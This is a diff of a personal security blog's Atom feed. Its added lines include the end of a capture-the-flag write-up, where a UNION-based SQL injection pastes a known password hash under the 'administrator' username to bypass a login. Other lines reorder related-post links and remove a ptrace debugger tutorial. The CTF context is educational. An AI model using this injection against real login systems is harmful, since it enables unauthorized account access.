+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha256pwdhash&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&quot;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;--&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The only change I made from the previous input was that I put the word “administrator” at the beginning of my SQL injection.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 50%; height: 50%;&quot; src=&quot;../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake7.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On the next page, I received the flag.
+&lt;img style=&quot;margin-left: auto; margin-right: auto; width: 50%; height: 50%;&quot; src=&quot;../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake8.png&quot; /&gt;&lt;/p&gt;
+
+&lt;section class=&quot;related&quot;&gt;
+  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
+  &lt;ul class=&quot;post-list&quot;&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
+          Hooking Linux Function Calls Via LD_PRELOAD
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
+          Creating a Basic Heap Allocator
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+  &lt;/ul&gt;
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Recently, I played in Lockheed Martin’s 2021 CTF challenge, and my team, nullbytes, got first place. I mainly worked on the PWN and web exploitation challenges for my team, so here are my solutions for all the problems in those two categories.</summary></entry><entry><title type="html">Hooking Linux Function Calls Via LD_PRELOAD</title><link href="http://localhost:4000/2021/01/07/hooking-linux-function-calls-via-ld-preload.html" rel="alternate" type="text/html" title="Hooking Linux Function Calls Via LD_PRELOAD" /><published>2021-01-07T00:00:00-05:00</published><updated>2021-01-07T00:00:00-05:00</updated><id>http://localhost:4000/2021/01/07/hooking-linux-function-calls-via-ld-preload</id><content type="html" xml:base="http://localhost:4000/2021/01/07/hooking-linux-function-calls-via-ld-preload.html">&lt;p&gt;Hooking functions is the act of replacing a pointer to a function with a different pointer so that another function is called instead of the original function. For example, suppose there was a function &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt; being called inside of a program. If an attacker has write permissions to the binary file, then the attacker can replace the code calling &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt; with code that calls some malicious function &lt;code class=&quot;highlighter-rouge&quot;&gt;y()&lt;/code&gt; instead.&lt;/p&gt;
 
 &lt;p&gt;Below contains the code that will be used for this tutorial. The code contains a &lt;code class=&quot;highlighter-rouge&quot;&gt;check_pass()&lt;/code&gt; function, which checks whether a user-supplied password is equal to the string “p@ssw0rd”. In real life, the program would (hopefully) not use a hardcoded plaintext password and instead query a database of hashed passwords. For this example, let’s ignore the fact that the password could be retrieved with the &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; command, and let’s assume that the attacker has no idea what the password is.&lt;/p&gt;
 &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
@@ -136,6 +698,12 @@ Enter the password: SomethingWrong
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
           GOT Overwrite Using Format Strings
         &lt;/a&gt;
@@ -144,12 +712,6 @@ Enter the password: SomethingWrong
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
-          Defeating ASLR via Memory Leak
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -431,6 +993,12 @@ AABBBB0x42424242
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
           Hooking Linux Function Calls Via LD_PRELOAD
         &lt;/a&gt;
@@ -439,12 +1007,6 @@ AABBBB0x42424242
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
-          Defeating ASLR via Memory Leak
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1052,6 +1614,12 @@ Freeing buffer 2.
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
           Hooking Linux Function Calls Via LD_PRELOAD
         &lt;/a&gt;
@@ -1060,12 +1628,6 @@ Freeing buffer 2.
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
           GOT Overwrite Using Format Strings
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
-          Defeating ASLR via Memory Leak
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1312,6 +1874,12 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
           Hooking Linux Function Calls Via LD_PRELOAD
         &lt;/a&gt;
@@ -1320,12 +1888,6 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
           GOT Overwrite Using Format Strings
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
-          Creating a Basic Heap Allocator
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1740,6 +2302,12 @@ Please enter a number 1-4 to continue...
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
           Hooking Linux Function Calls Via LD_PRELOAD
         &lt;/a&gt;
@@ -1748,12 +2316,6 @@ Please enter a number 1-4 to continue...
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
           GOT Overwrite Using Format Strings
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
-          Creating a Basic Heap Allocator
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1950,6 +2512,12 @@ flag{insert_flag_here}
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
           Hooking Linux Function Calls Via LD_PRELOAD
         &lt;/a&gt;
@@ -1958,12 +2526,6 @@ flag{insert_flag_here}
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
           GOT Overwrite Using Format Strings
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
-          Creating a Basic Heap Allocator
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -2300,6 +2862,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
           Hooking Linux Function Calls Via LD_PRELOAD
         &lt;/a&gt;
@@ -2308,12 +2876,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
           GOT Overwrite Using Format Strings
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
-          Creating a Basic Heap Allocator
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -2464,6 +3026,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
           Hooking Linux Function Calls Via LD_PRELOAD
         &lt;/a&gt;
@@ -2472,12 +3040,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
           GOT Overwrite Using Format Strings
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
-          Creating a Basic Heap Allocator
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -2838,212 +3400,10 @@ void ReadMemory(char *addr_hex, int n) {
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
-          Hooking Linux Function Calls Via LD_PRELOAD
+        &lt;a href=&quot;/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html&quot;&gt;
+          LM Cyber CTF Writeups For PWN And Web Challenges
         &lt;/a&gt;
       &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
-          GOT Overwrite Using Format Strings
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
-          Creating a Basic Heap Allocator
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-  &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the Linux Debugger that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.</summary></entry><entry><title type="html">Creating a Barebones Linux Debugger</title><link href="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Linux Debugger" /><published>2020-03-07T00:00:00-05:00</published><updated>2020-03-07T00:00:00-05:00</updated><id>http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Linux programs. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.&lt;/p&gt;
-
-&lt;p&gt;The first thing that we need to do is to run the program we want to debug in a separate process using fork(). The program’s name will be given as a command line argument to our debugger, and any additional arguments that we want to past to the program we are currently debugging can also be passed as arguments. Once we call fork() to make a copy of this process, we will make the child process call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_TRACEME, 0, 0, 0);&lt;/code&gt;, which will let the child process know that it is going to be debugged by the parent process. The &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace()&lt;/code&gt; function will be used throughout our code as it allows the parent process to control and observe the child process. From there, we will use execv() to actually execute the program that we want to execute. As soon as this happens, the tracee (the program being debugged) stop pause execution on a SIGTRAP, which will be used to prevent the tracee from executing any more code unless the tracer/debugger allows it.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Represents the PID of the program being debugged
-static int pid = 0;
-
-// Forks this process, runs the given executable using the given arguments, and returns the PID to the parent
-int run(char **argv) {
-    pid = fork();
-
-    // If statement will only execute if we are the child process
-    if(pid == 0) {
-        ptrace(PTRACE_TRACEME, 0, 0, 0); // Allow the parent to trace us
-        execv(argv[1], &amp;amp;(argv[2])); // Execute the program we wanted to execute.
-        // The tracee should stop on SIGTRAP as soon as execv() is called.
-        // This will prevent the tracee from executing any code unless the tracer allows it to using ptrace()
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now, the child process has the program that we want to debug loaded up into it, and it has paused execution so that we can start to take control of it as its parent process. Inside our main function, we need to obtain the program that we must run from the command line arguments and call run(). Then we will also use &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL);&lt;/code&gt; on the parent process so that if the parent exits, then the child process must also exit.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Main function
-int main(int argc, char **argv) {
-    // Make sure we have the correct number of arguments
-    if(argc != 2) {
-        printf(&quot;Usage: ./debug &amp;lt;program&amp;gt; &amp;lt;additional arguments&amp;gt;\n&quot;);
-        exit(0);
-    }
-
-    run(argv); // Run the given executable and obtain its PID
-    ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL); // Make sure that if the tracer exits, then the tracee must also exit
-    debugger(pid); // Run the debugger
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The debugger() function is a function that I made to help me process commands inputted by the user. It will parse the command the user types in and calls the correct function to do the action that the user requested. I also made a print_help() function that will print out all of the possible commands that can be used.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads a line of input
-void readline(char *input) {
-    // Reads a line of input
-    char buf[500];
-    printf(&quot;&amp;gt; &quot;);
-    fgets(input, 500, stdin);
-
-    // Get rid of the '\n' character
-    int len = strlen(input);
-    if(len &amp;gt;= 2 &amp;amp;&amp;amp; input[len-1] == '\n') {
-        input[len-1] = '\0';
-    }
-}
-
-// Prints the help menu
-void print_help() {
-    printf(&quot;regs: Prints out the values of each register.\n&quot;);
-    printf(&quot;step: Executes a single instruction.\n&quot;);
-    printf(&quot;mem &amp;lt;addr&amp;gt;: Reads the value at the given memory address.\n&quot;);
-    printf(&quot;quit: Closes the debugger.\n&quot;);
-}
-
-// Actual debugger code
-void debugger() {
-    char *input = malloc(500); // Input that the user types in
-
-    // Loop until the user types in &quot;exit&quot;
-    do {
-        readline(input); // Read a command
-
-        // Parse the command
-        if(strncmp(&quot;regs&quot;, input, 5) == 0 || strncmp(&quot;r&quot;, input, 2) == 0) {
-            print_regs();
-        } else if(strncmp(&quot;step&quot;, input, 5) == 0 || strncmp(&quot;s&quot;, input, 2) == 0) {
-            step();
-        } else if(strncmp(&quot;mem &quot;, input, 4) == 0) {
-            strtok(input, &quot; &quot;); // Mem should have a single input parameter, which is the memory address to read in hex
-            read_mem(strtok(NULL, &quot; &quot;));
-        } else if(strncmp(&quot;help&quot;, input, 5) == 0 || strncmp(&quot;h&quot;, input, 2) == 0) {
-            print_help();
-        }
-    } while(strncmp(input, &quot;exit&quot;, 5) &amp;amp;&amp;amp; strncmp(input, &quot;quit&quot;, 5) &amp;amp;&amp;amp; strncmp(input, &quot;q&quot;, 2));
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The first thing that I will show you how to do is how to read the values of the registers in the debugged program. We will be using the &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_GETREGS, pid, 0, &amp;amp;regs)&lt;/code&gt; function to read the values of the registers in the debugged program. The “regs” variable that we’ll use as an input parameter for this function has a type of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct user_regs_struct&lt;/code&gt;, and the ptrace() function will store the values of the registers inside of that variable. The values of the registers can then be easily read by using the regs variable (i.e. use &lt;code class=&quot;highlighter-rouge&quot;&gt;regs.rax&lt;/code&gt; to read the value of rax).&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Prints out all of the register values inside of the process we're debugging
-void print_regs() {
-    // Create the struct that will contain all of the process' registers
-    struct user_regs_struct regs;
-
-    // Read the values of each register and store it inside of the struct
-    ptrace(PTRACE_GETREGS, pid, 0, &amp;amp;regs);
-
-    // Print out each value
-    printf(&quot;rip 0x%llx\n&quot;, regs.rip);
-    printf(&quot;rax 0x%llx\n&quot;, regs.rax);
-    printf(&quot;rbx 0x%llx\n&quot;, regs.rbx);
-    printf(&quot;rcx 0x%llx\n&quot;, regs.rcx);
-    printf(&quot;rdx 0x%llx\n&quot;, regs.rdx);
-    printf(&quot;rsi 0x%llx\n&quot;, regs.rsi);
-    printf(&quot;rdi 0x%llx\n&quot;, regs.rdi);
-    printf(&quot;rsp 0x%llx\n&quot;, regs.rsp);
-    printf(&quot;rbp 0x%llx\n&quot;, regs.rbp);
-    printf(&quot;r8 0x%llx\n&quot;, regs.r8);
-    printf(&quot;r9 0x%llx\n&quot;, regs.r9);
-    printf(&quot;r10 0x%llx\n&quot;, regs.r10);
-    printf(&quot;r11 0x%llx\n&quot;, regs.r11);
-    printf(&quot;r12 0x%llx\n&quot;, regs.r12);
-    printf(&quot;r13 0x%llx\n&quot;, regs.r13);
-    printf(&quot;r14 0x%llx\n&quot;, regs.r14);
-    printf(&quot;r15 0x%llx\n&quot;, regs.r15);
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;To read any word from memory, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_PEEKDATA, pid, addr, 0)&lt;/code&gt;, where addr is a long representing the address that we want to read from. This function will return a long variable that we can then print out in hex.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads the value at the given memory address
-void read_mem(char *addr_input) {
-    // Make sure that the input isn't NULL
-    if(addr_input != NULL) {
-        long addr = strtol(addr_input, 0, 16); // Convert the address from a hex string to a long
-        long data = ptrace(PTRACE_PEEKDATA, pid, addr, 0); // Obtain the data
-        printf(&quot;%lx\n&quot;, data);
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Stepping through a single line of assembly code is even easier. We can just call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_SINGLESTEP, pid, 0, 0);&lt;/code&gt;, which will just execute one line of code.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Steps through a single line of assembly code
-void step() {
-    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
-}
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now we should have a working debugger. You can try using this to debug a basic program, and it should work just fine.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./debug todebug
-&amp;gt; help
-regs: Prints out the values of each register.
-step: Executes a single instruction.
-mem &amp;lt;addr&amp;gt;: Reads the value at the given memory address.
-quit: Closes the debugger.
-&amp;gt; regs
-rip 0x7fcfb2eee090
-rax 0x0
-rbx 0x0
-rcx 0x0
-rdx 0x0
-rsi 0x0
-rdi 0x0
-rsp 0x7fff2e69c670
-rbp 0x0
-r8 0x0
-r9 0x0
-r10 0x0
-r11 0x0
-r12 0x0
-r13 0x0
-r14 0x0
-r15 0x0
-&amp;gt; mem 0x7fcfb2eee090
-f98e8e78948
-&amp;gt; step
-&amp;gt; r
-rip 0x7fcfb2eee093
-rax 0x0
-rbx 0x0
-rcx 0x0
-rdx 0x0
-rsi 0x0
-rdi 0x7fff2e69c670
-rsp 0x7fff2e69c670
-rbp 0x0
-r8 0x0
-r9 0x0
-r10 0x0
-r11 0x0
-r12 0x0
-r13 0x0
-r14 0x0
-r15 0x0
-&amp;gt; q
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;section class=&quot;related&quot;&gt;
-  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
-  &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2021/01/07/hooking-linux-function-calls-via-ld-preload.html&quot;&gt;
@@ -3057,11 +3417,5 @@ r15 0x0
         &lt;/a&gt;
       &lt;/li&gt;
     
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
-          Creating a Basic Heap Allocator
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
   &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Linux programs. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.</summary></entry></feed>
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the Linux Debugger that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.</summary></entry></feed>
